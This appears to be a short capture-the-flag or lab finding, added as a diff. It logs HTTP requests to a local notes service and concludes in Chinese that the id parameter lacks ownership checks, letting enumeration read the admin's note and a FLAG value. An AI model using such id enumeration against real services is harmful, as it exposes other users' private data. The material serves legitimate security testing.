@@ -1,0 +1,6 @@
+GET http://127.0.0.1:18081/notes?id=1  -> {"id":"1","note":"alice-note","viewer":null}
+GET http://127.0.0.1:18081/notes?id=2  -> {"id":"2","note":"admin-secret-FLAG{idor_user2}","viewer":null}
+GET http://127.0.0.1:18081/notes?id=0/3/4/5 -> {"error":"no note"}
+
+结论：/notes?id= 不校验所有权（无鉴权、无 owner 校验），可枚举 id 读取他人（admin uid=2）笔记。
+泄露内容：admin-secret-FLAG{idor_user2}
